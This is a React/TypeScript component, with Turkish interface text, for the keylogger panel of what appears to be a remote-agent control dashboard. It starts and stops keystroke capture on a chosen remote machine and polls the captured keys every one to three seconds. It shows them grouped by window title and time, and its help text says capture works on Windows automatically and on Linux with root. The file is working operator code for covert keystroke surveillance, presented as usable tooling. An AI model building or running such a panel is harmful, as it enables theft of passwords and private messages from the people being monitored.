import { useState, useEffect, useRef } from "react";
import {
  fetchKeylog,
  startKeylogger,
  stopKeylogger,
  clearKeylog,
  type KeyEvent,
} from "../../api";
import {
  SpinnerGapIcon,
  WarningCircleIcon,
  KeyboardIcon,
  XIcon,
  EraserIcon,
  MonitorIcon,
  ClockIcon,
} from "@phosphor-icons/react";

function renderKeyText(text: string) {
  const parts: React.ReactNode[] = [];
  let buffer = "";
  let i = 0;
  let partKey = 0;

  while (i < text.length) {
    if (text[i] === "[") {
      const end = text.indexOf("]", i);
      if (end !== -1) {
        if (buffer) {
          parts.push(<span key={partKey++} className="keylog-chars">{buffer}</span>);
          buffer = "";
        }
        const inner = text.substring(i + 1, end);
        parts.push(
          <span
            key={partKey++}
            className={`keylog-badge ${inner === "ENTER" ? "keylog-badge-enter" : inner === "BACKSPACE" ? "keylog-badge-del" : ""}`}
          >
            {inner}
          </span>
        );
        i = end + 1;
        continue;
      }
    }
    buffer += text[i];
    i++;
  }
  if (buffer) {
    parts.push(<span key={partKey++} className="keylog-chars">{buffer}</span>);
  }
  return parts;
}

export function KeylogDrawerContent({
  agentId,
  isOnline,
}: {
  agentId: string;
  isOnline: boolean;
}) {
  const [active, setActive] = useState(false);
  const [events, setEvents] = useState<KeyEvent[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const scrollRef = useRef<HTMLDivElement>(null);
  const autoScrollRef = useRef(true);

  useEffect(() => {
    let cancelled = false;
    const poll = async () => {
      try {
        const data = await fetchKeylog(agentId, 2000);
        if (cancelled) return;
        setEvents(data.events);
        setActive(data.active);
        if (data.error) {
          setError(data.error);
          setLoading(false);
        }
      } catch {}
    };
    poll();
    const iv = setInterval(poll, active ? 1000 : 3000);
    return () => { cancelled = true; clearInterval(iv); };
  }, [agentId, active]);

  useEffect(() => {
    if (autoScrollRef.current && scrollRef.current) {
      scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
    }
  }, [events]);

  const handleScroll = () => {
    const el = scrollRef.current;
    if (!el) return;
    autoScrollRef.current = el.scrollHeight - el.scrollTop - el.clientHeight < 60;
  };

  const handleStart = async () => {
    setLoading(true);
    setError(null);
    try {
      const res = await startKeylogger(agentId);
      if (!res.success) setError(res.error || "Başlatılamadı");
      else setActive(true);
    } catch (err: any) {
      setError(err.message);
    }
    setLoading(false);
  };

  const handleStop = async () => {
    try {
      await stopKeylogger(agentId);
      setActive(false);
    } catch {}
  };

  const handleClear = async () => {
    await clearKeylog(agentId);
    setEvents([]);
  };

  const renderEvents = () => {
    if (events.length === 0) return null;

    const groups: { window: string; text: string; startTs: number; endTs: number }[] = [];
    let currentWindow = "";
    let currentText = "";
    let startTs = 0;
    let endTs = 0;

    for (const ev of events) {
      const win = ev.window || "Bilinmeyen Pencere";
      if (win !== currentWindow) {
        if (currentText) {
          groups.push({ window: currentWindow, text: currentText, startTs, endTs });
        }
        currentWindow = win;
        currentText = ev.key;
        startTs = ev.ts;
        endTs = ev.ts;
      } else {
        currentText += ev.key;
        endTs = ev.ts;
      }
    }
    if (currentText) {
      groups.push({ window: currentWindow, text: currentText, startTs, endTs });
    }

    return groups.map((g, i) => (
      <div key={i} className="keylog-group">
        <div className="keylog-group-header">
          <span className="keylog-window-name">
            <MonitorIcon size={12} weight="bold" />
            {g.window}
          </span>
          <span className="keylog-time">
            <ClockIcon size={10} />
            {new Date(g.startTs).toLocaleTimeString("tr-TR")}
            {g.startTs !== g.endTs && ` — ${new Date(g.endTs).toLocaleTimeString("tr-TR")}`}
          </span>
        </div>
        <div className="keylog-text">
          {renderKeyText(g.text)}
        </div>
      </div>
    ));
  };

  return (
    <div className="keylog-container">
      <div className="keylog-toolbar">
        {!active ? (
          <button
            className="vuln-scan-btn"
            onClick={handleStart}
            disabled={!isOnline || loading}
            style={{ gap: 5 }}
          >
            {loading ? (
              <><SpinnerGapIcon size={13} className="si-run" /> Başlatılıyor...</>
            ) : (
              <><KeyboardIcon size={13} /> Kaydı Başlat</>
            )}
          </button>
        ) : (
          <button
            className="vuln-scan-btn"
            onClick={handleStop}
            style={{ gap: 5, borderColor: "rgba(220,38,38,0.3)", background: "rgba(220,38,38,0.08)", color: "#ef5350" }}
          >
            <XIcon size={13} weight="bold" />
            Kaydı Durdur
          </button>
        )}

        {events.length > 0 && (
          <button
            className="vuln-scan-btn keylog-clear-btn"
            onClick={handleClear}
            style={{ gap: 5 }}
          >
            <EraserIcon size={13} />
            Temizle
          </button>
        )}

        <div className="keylog-toolbar-info">
          {events.length > 0 && (
            <span className="keylog-count">
              {events.length} tuş
            </span>
          )}
          {active ? (
            <span className="screen-status-badge live">
              <span className="screen-status-dot" />
              KAYIT AKTİF
            </span>
          ) : (
            <span className="screen-status-badge stopped">
              <span className="screen-status-dot" />
              Kapalı
            </span>
          )}
        </div>
      </div>

      {error && (
        <div className="keylog-error">
          <WarningCircleIcon size={16} weight="fill" />
          <span>{error}</span>
        </div>
      )}

      <div className="keylog-content" ref={scrollRef} onScroll={handleScroll}>
        {events.length === 0 && !active && (
          <div className="keylog-empty">
            <KeyboardIcon size={48} weight="duotone" />
            <span>Henüz tuş kaydı yok</span>
            <span className="keylog-empty-sub">
              "Kaydı Başlat" butonuna basarak uzak makinedeki tuş vuruşlarını kaydedin.
              {"\n"}Windows'ta otomatik çalışır, Linux'ta root yetkisi gerekir.
            </span>
          </div>
        )}

        {events.length === 0 && active && (
          <div className="keylog-waiting">
            <SpinnerGapIcon size={28} className="si-run" />
            <span>Tuş vuruşları bekleniyor...</span>
            <span className="keylog-empty-sub">Uzak makinede bir şeyler yazıldığında burada görünecek</span>
          </div>
        )}

        {renderEvents()}
      </div>
    </div>
  );
}
